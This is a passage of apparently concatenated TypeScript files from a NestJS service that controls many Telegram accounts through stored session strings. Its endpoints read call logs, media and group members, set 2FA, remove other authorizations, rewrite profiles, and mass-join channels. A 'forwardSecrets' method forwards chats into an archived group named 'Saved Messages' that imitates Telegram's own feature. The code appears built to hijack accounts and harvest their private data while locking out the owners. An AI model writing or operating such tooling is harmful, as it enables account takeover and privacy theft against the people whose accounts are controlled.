fromId, channel);\r\n    }\r\n    @Get('leaveChannel/:mobile/:channel')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannel(@Param('mobile') mobile: string, @Param('channel') channel: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannel(mobile, channel);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('getCallLog/:mobile')\r\n    @ApiOperation({ summary: 'Get CallLog  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getCallLog(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getCallLog(mobile);\r\n    }\r\n\r\n    @Get('getMe/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMe(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getMe(mobile);\r\n    }\r\n\r\n    @Get('getMedia/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMedia(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getmedia(mobile);\r\n    }\r\n\r\n    @Get('channelinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'sendIds', description: 'Whether to send IDs or not', required: false })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChannelInfo(@Param('mobile') mobile: string, @Query('sendIds') sendIds: boolean = false) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChannelInfo(mobile, sendIds);\r\n    }\r\n\r\n    @Get('leaveChannels/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannels(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannels(mobile);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('auths/:mobile')\r\n    @ApiOperation({ summary: 'Get authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getAuths(mobile);\r\n    }\r\n\r\n    @Get('set2Fa/:mobile')\r\n    @ApiOperation({ summary: 'Set 2Fa' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: '2Fa set successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async set2Fa(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.set2Fa(mobile);\r\n    }\r\n\r\n    @Get('setprofilepic/:mobile/:name')\r\n    @ApiOperation({ summary: 'Set Profile Picture' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'name', description: 'Profile name', type: String })\r\n    async setProfilePic(\r\n        @Param('mobile') mobile: string,\r\n        @Param('name') name: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.setProfilePic(mobile, name)\r\n    }\r\n\r\n    @Get('updatePrivacy/:mobile')\r\n    @ApiOperation({ summary: 'Update Privacy Settings' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async updatePrivacy(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updatePrivacy(mobile)\r\n    }\r\n\r\n    @Get('UpdateUsername/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String, required: false })\r\n    async updateUsername(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateUsername(mobile, username)\r\n    }\r\n\r\n    @Get('getGrpMembers/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String })\r\n    async getGrpMembers(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getGrpMembers(mobile, username)\r\n    }\r\n\r\n    \r\n\r\n    @Post('addcontact')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContact(@Body() addContactDto: AddContactDto) {\r\n        const { mobile, data, prefix } = addContactDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContact(mobile, data, prefix);\r\n    }\r\n\r\n\r\n    @Post('addcontacts')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactsDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContacts(@Body() addContactsDto: AddContactsDto) {\r\n        const { mobile, phoneNumbers, prefix } = addContactsDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContacts(mobile, phoneNumbers, prefix);\r\n    }\r\n\r\n    @Get('newSession/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async newSession(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createNewSession(mobile)\r\n    }\r\n\r\n    @Get('updateNameandBio/:mobile')\r\n    @ApiOperation({ summary: 'Update Name' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'firstName', description: 'First Name', type: String })\r\n    @ApiQuery({ name: 'about', description: 'About', type: String })\r\n    async updateName(\r\n        @Param('mobile') mobile: string,\r\n        @Query('firstName') firstName: string,\r\n        @Query('about') about: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateNameandBio(mobile, firstName, about)\r\n    }\r\n\r\n    @Get('metadata')\r\n    async getMediaMetadata(@Query('mobile') mobile: string, @Query('chatId') chatId: string, @Query('offset') offset: number, @Query('limit') limit: number) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\r\n    }\r\n\r\n    @Get('download')\r\n    async downloadMediaFile(\r\n        @Query('mobile') mobile: string,\r\n        @Query('messageId') messageId: number,\r\n        @Query('chatId') chatId: string,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\r\n    }\r\n\r\n    @Get('downloadProfilePic')\r\n    async downloadProfilePic(\r\n        @Query('mobile') mobile: string,\r\n        @Query('index') index: number,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        try {\r\n            const filePath = await this.telegramService.downloadProfilePic(mobile, index);\r\n            if (!filePath) {\r\n                return res.status(404).send('Profile photo not found.');\r\n            }\r\n\r\n            res.download(filePath, 'profile_pic.jpg', (err) => {\r\n                if (err) {\r\n                    console.error('Error sending the file:', err);\r\n                    res.status(500).send('Error downloading the file.');\r\n                }\r\n\r\n                fs.unlink(filePath, (err) => {\r\n                    if (err) {\r\n                        console.error('Error deleting the file:', err);\r\n                    }\r\n                });\r\n            });\r\n        } catch (error) {\r\n            console.error('Error in endpoint:', error);\r\n            res.status(500).send('An error occurred.');\r\n        }\r\n    }\r\n\r\n\r\n    @Get('forward/:mobile/:chatId/:messageId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    @ApiParam({ name: 'messageId', description: 'messageId of message', type: String })\r\n    async forrward(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n        @Param('messageId') messageId: number,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardMessage(mobile, chatId, messageId)\r\n    }\r\n\r\n    @Get('deleteChat/:mobile/:chatId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    async deleteChat(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteChat(mobile, chatId)\r\n    }\r\n\r\n    @Get('deleteProfilePics/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async deleteProfilePics(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteProfilePhotos(mobile)\r\n    }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TelegramController } from './Telegram.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\nimport { TelegramService } from './Telegram.service';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\n\r\n@Module({\r\n    imports: [\r\n        forwardRef(() => UsersModule),\r\n        BufferClientModule,\r\n        forwardRef(() => ActiveChannelsModule),\r\n        forwardRef(() => ChannelsModule)],\r\n    controllers: [TelegramController],\r\n    providers: [TelegramService],\r\n    exports: [TelegramService]\r\n})\r\nexport class TelegramModule { }\r\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\r\nimport { UsersService } from '../users/users.service';\r\nimport { contains, parseError, sleep } from \"../../utils\";\r\nimport TelegramManager from \"./TelegramManager\";\r\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\r\nimport { CloudinaryService } from '../../cloudinary';\r\nimport { Api, TelegramClient } from 'telegram';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport * as path from 'path';\r\nimport { ChannelsService } from '../channels/channels.service';\r\nimport { Channel } from '../channels/schemas/channel.schema';\r\nimport { EntityLike } from 'telegram/define';\r\n\r\n@Injectable()\r\nexport class TelegramService implements OnModuleDestroy {\r\n    private static clientsMap: Map<string, TelegramManager> = new Map();\r\n    constructor(\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        private bufferClientService: BufferClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ChannelsService))\r\n        private channelsService: ChannelsService,\r\n    ) {}\r\n\r\n    async onModuleDestroy() {\r\n        await this.disconnectAll();\r\n    }\r\n\r\n    public getActiveClientSetup() {\r\n        return TelegramManager.getActiveClientSetup();\r\n    }\r\n\r\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\r\n        TelegramManager.setActiveClientSetup(data);\r\n    }\r\n\r\n    public async getClient(number: string) {\r\n        const client = TelegramService.clientsMap.get(number);\r\n        try {\r\n            if (client && client.connected()) {\r\n                await client.connect()\r\n                return client\r\n            }\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n        return undefined;\r\n    }\r\n\r\n    public hasClient(number: string) {\r\n        return TelegramService.clientsMap.has(number);\r\n    }\r\n\r\n    async deleteClient(number: string) {\r\n        const cli = await this.getClient(number);\r\n        await cli?.disconnect();\r\n        console.log(\"Disconnected : \", number)\r\n        return TelegramService.clientsMap.delete(number);\r\n    }\r\n\r\n    async disconnectAll() {\r\n        const data = TelegramService.clientsMap.entries();\r\n        console.log(\"Disconnecting All Clients\");\r\n        for (const [phoneNumber, client] of data) {\r\n            try {\r\n                await client?.disconnect();\r\n                TelegramService.clientsMap.delete(phoneNumber);\r\n                console.log(`Client disconnected: ${phoneNumber}`);\r\n            } catch (error) {\r\n                console.log(parseError(error));\r\n                console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n            }\r\n        }\r\n        TelegramService.clientsMap.clear();\r\n        // this.bufferClientService.clearBufferMap()\r\n        this.bufferClientService.clearJoinChannelInterval()\r\n    }\r\n\r\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        if (!this.hasClient(mobile)) {\r\n            let telegramManager = new TelegramManager(user.session, user.mobile);\r\n            let client: TelegramClient\r\n            try {\r\n                client = await telegramManager.createClient(handler);\r\n                await client.getMe();\r\n                if (client) {\r\n                    TelegramService.clientsMap.set(mobile, telegramManager);\r\n                    if (autoDisconnect) {\r\n                        setTimeout(async () => {\r\n                            if (client.connected || await this.getClient(mobile)) {\r\n                                console.log(\"SELF destroy client : \", mobile);\r\n                                await telegramManager.disconnect();\r\n                            } else {\r\n                                console.log(\"Client Already Disconnected : \", mobile);\r\n                            }\r\n                            TelegramService.clientsMap.delete(mobile);\r\n                        }, 180000)\r\n                    } else {\r\n                        setInterval(async () => {\r\n                            //console.log(\"destroying loop :\", mobile)\r\n                            //client._destroyed = true\r\n                            // if (!client.connected) {\r\n                            // await client.connect();\r\n                            //}\r\n                        }, 20000);\r\n                    }\r\n                    return telegramManager;\r\n                } else {\r\n                    throw new BadRequestException('Client Expired');\r\n                }\r\n            } catch (error) {\r\n                console.log(\"Parsing Error\");\r\n                if (telegramManager) {\r\n                    await telegramManager.disconnect();\r\n                    telegramManager = null;\r\n                    TelegramService.clientsMap.delete(mobile);\r\n                }\r\n                const errorDetails = parseError(error);\r\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\r\n                    console.log(\"Deleting User: \", user.mobile);\r\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\r\n                } else {\r\n                    console.log('Not Deleting user');\r\n                }\r\n                throw new BadRequestException(errorDetails.message)\r\n            }\r\n        } else {\r\n            console.log(\"Client Already exists\")\r\n            return await this.getClient(mobile)\r\n        }\r\n    }\r\n\r\n    async getMessages(mobile: string, username: string, limit: number = 8) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.getMessages(username, limit);\r\n    }\r\n\r\n\r\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.getMessagesNew(username, offset, limit);\r\n    }\r\n\r\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.sendInlineMessage(chatId, message, url);\r\n    }\r\n\r\n    async getChatId(mobile: string, username: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getchatId(username);\r\n    }\r\n\r\n    async getLastActiveTime(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getLastActiveTime();\r\n    }\r\n\r\n    // async joinChannels(mobile: string, channels: Channel[]) {\r\n    //     console.log(\"Started Joining- \", mobile, \" - channelsLen - \", channels.length);\r\n\r\n    //     const joinChannelWithDelay = async (index: number) => {\r\n    //         const telegramClient = await this.createClient(mobile, false, false)\r\n    //         if (index >= channels.length) {\r\n    //             console.log(mobile, \" - finished joining channels\");\r\n    //             await this.deleteClient(mobile);\r\n    //             console.log(\"Join channel stopped : \", mobile);\r\n    //             return;\r\n    //         }\r\n\r\n    //         console.log(mobile, \" - Will Try next now\");\r\n    //         const channel = channels[index]\r\n    //         const username = channel.username;\r\n    //         console.log(mobile, \"Trying: \", username);\r\n    //         try {\r\n    //             await tryJoiningChannel(telegramClient, channel, username, mobile);\r\n    //         } catch (error) {\r\n    //             parseError(error, \"Outer Err: \");\r\n    //             await this.removeChannels(error, channel.channelId, channel.username);\r\n    //         }\r\n    //         console.log(mobile, \" - On waiting period\");\r\n    //         await this.deleteClient(mobile)\r\n    //         this.joinChannelTimeoutId = setTimeout(async () => {\r\n    //             joinChannelWithDelay(index + 1);\r\n    //         }, 3 * 60 * 1000);\r\n    //     };\r\n\r\n\r\n\r\n    //     joinChannelWithDelay(0);\r\n    //     return 'Channels joining in progress';\r\n    // }\r\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.joinChannel(chatEntity.username);\r\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\r\n            if (chatEntity.canSendMsgs) {\r\n                // try {\r\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\r\n                //     console.log(\"updated ActiveChannels\");\r\n                // } catch (error) {\r\n                //     console.log(parseError(error));\r\n                //     console.log(\"Failed to update ActiveChannels\");\r\n                // }\r\n            } else {\r\n                await this.channelsService.remove(chatEntity.channelId);\r\n                await this.activeChannelsService.remove(chatEntity.channelId);\r\n                console.log(\"Removed Channel- \", chatEntity.username);\r\n            }\r\n        } catch (error) {\r\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\r\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\r\n            throw error\r\n        }\r\n    };\r\n\r\n    async removeChannels(error: any, channelId: string, username: string) {\r\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\r\n            try {\r\n                if (channelId) {\r\n                    await this.channelsService.remove(channelId)\r\n                    await this.activeChannelsService.remove(channelId);\r\n                    console.log(\"Removed Channel- \", channelId);\r\n                } else {\r\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\r\n                    await this.channelsService.remove(channelDetails.channelId)\r\n                    await this.activeChannelsService.remove(channelDetails.channelId);\r\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\r\n                }\r\n            } catch (searchError) {\r\n                console.log(\"Failed to search/remove channel: \", searchError);\r\n            }\r\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\r\n            await this.channelsService.update(channelId, { private: true })\r\n            await this.activeChannelsService.update(channelId, { private: true });\r\n        }\r\n    }\r\n\r\n    async getGrpMembers(mobile: string, entity: EntityLike) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.getGrpMembers(entity)\r\n        } catch (err) {\r\n            console.error(\"Error fetching group members:\", err);\r\n        }\r\n    }\r\n\r\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.addContact(data, prefix)\r\n        } catch (err) {\r\n            console.error(\"Error fetching adding Contacts:\", err);\r\n        }\r\n    }\r\n\r\n\r\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.addContacts(phoneNumbers, prefix)\r\n        } catch (err) {\r\n            console.error(\"Error fetching adding Contacts:\", err);\r\n        }\r\n    }\r\n\r\n    async removeOtherAuths(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        await telegramClient.removeOtherAuths();\r\n        return 'Authorizations removed successfully';\r\n    }\r\n\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getSelfMsgsInfo(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getSelfMSgsInfo();\r\n    }\r\n\r\n    async createGroup(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createGroup();\r\n    }\r\n\r\n    async forwardSecrets(mobile: string, fromChatId: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createGroupAndForward(fromChatId);\r\n    }\r\n\r\n\r\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\r\n    }\r\n\r\n\r\n    async getCallLog(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getCallLog();\r\n    }\r\n\r\n    async getmedia(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMediaMessages();\r\n    }\r\n\r\n    async getChannelInfo(mobile: string, sendIds: boolean = false) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        const result = await telegramClient.getDialogs({ limit: 10, archived: false })\r\n        // console.log(result)\r\n        return await telegramClient.channelInfo(sendIds);\r\n    }\r\n\r\n    async getAuths(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getAuths();\r\n    }\r\n\r\n    async getMe(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMe();\r\n    }\r\n\r\n    async createNewSession(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createNewSession();\r\n    }\r\n\r\n    async set2Fa(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.set2fa();\r\n            await telegramClient.disconnect();\r\n            return '2Fa set successfully'\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile);\r\n        await telegramClient.updatePrivacyforDeletedAccount()\r\n    }\r\n\r\n    async deleteProfilePhotos(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile);\r\n        await telegramClient.deleteProfilePhotos()\r\n    }\r\n\r\n    async setProfilePic(\r\n        mobile: string, name: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        await telegramClient.deleteProfilePhotos();\r\n        try {\r\n            await CloudinaryService.getInstance(name);\r\n            await sleep(2000);\r\n            const rootPath = process.cwd();\r\n            console.log(\"checking path\", rootPath)\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\r\n            await sleep(1000);\r\n            await telegramClient.disconnect();\r\n            return 'Profile pic set successfully'\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async updatePrivacy(\r\n        mobile: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.updatePrivacy()\r\n            return \"Privacy updated successfully\";\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async downloadProfilePic(\r\n        mobile: string, index: number\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            return await telegramClient.downloadProfilePic(index)\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n\r\n    async updateUsername(\r\n        mobile: string, username: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            return await telegramClient.updateUsername(username)\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n\r\n    async getMediaMetadata(mobile: string, chatId: string, offset: number, limit: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMediaMetadata(chatId, offset, limit);\r\n    }\r\n\r\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\r\n    }\r\n\r\n    async forwardMessage(mobile: string, chatId: string, messageId: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.forwardMessage(chatId, messageId);\r\n    }\r\n\r\n    async leaveChannels(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        const channelinfo = await telegramClient.channelInfo(false);\r\n        const leaveChannelIds = channelinfo.canSendFalseChats\r\n        return await telegramClient.leaveChannels(leaveChannelIds);\r\n    }\r\n\r\n\r\n    async leaveChannel(mobile: string, channel: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.leaveChannels([channel]);\r\n    }\r\n\r\n\r\n    async deleteChat(mobile: string, chatId: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.deleteChat(chatId);\r\n    }\r\n    async updateNameandBio(\r\n        mobile: string,\r\n        firstName: string,\r\n        about?: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.updateProfile(firstName, about)\r\n            return \"Username updated successfully\";\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n}\r\n","import { TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\r\nimport { Api } from 'telegram/tl';\r\nimport axios from 'axios';\r\nimport * as fs from 'fs';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { contains, fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { TotalList, sleep } from 'telegram/Helpers';\r\nimport { Dialog } from 'telegram/tl/custom/dialog';\r\nimport { LogLevel } from 'telegram/extensions/Logger';\r\nimport { MailReader } from '../../IMap/IMap';\r\nimport * as bigInt from 'big-integer';\r\nimport { IterDialogsParams } from 'telegram/client/dialogs';\r\nimport { disconnectAll } from '../TgSignup/TgSignup.service';\r\nimport { EntityLike } from 'telegram/define';\r\n\r\nclass TelegramManager {\r\n    private session: StringSession;\r\n    public phoneNumber: string;\r\n    public client: TelegramClient | null;\r\n    private channelArray: string[];\r\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\r\n    constructor(sessionString: string, phoneNumber: string) {\r\n        this.session = new StringSession(sessionString);\r\n        this.phoneNumber = phoneNumber;\r\n        this.client = null;\r\n        this.channelArray = [];\r\n    }\r\n\r\n    public static getActiveClientSetup() {\r\n        return TelegramManager.activeClientSetup;\r\n    }\r\n\r\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\r\n        TelegramManager.activeClientSetup = data;\r\n    }\r\n\r\n    public async createGroup() {\r\n        const groupName = \"Saved Messages\"; // Customize your group name\r\n        const groupDescription = this.phoneNumber; // Optional description\r\n        const result: any = await this.client.invoke(\r\n            new Api.channels.CreateChannel({\r\n                title: groupName,\r\n                about: groupDescription,\r\n                megagroup: true,\r\n                forImport: true,\r\n            })\r\n        );\r\n        const { id, accessHash } = result.chats[0];\r\n\r\n        // Logic to categorize the dialog to a folder\r\n        const folderId = 1; // Replace with the desired folder ID\r\n        await this.client.invoke(\r\n            new Api.folders.EditPeerFolders({\r\n                folderPeers: [\r\n                    new Api.InputFolderPeer({\r\n                        peer: new Api.InputPeerChannel({\r\n                            channelId: id,\r\n                            accessHash: accessHash,\r\n                        }),\r\n                        folderId: 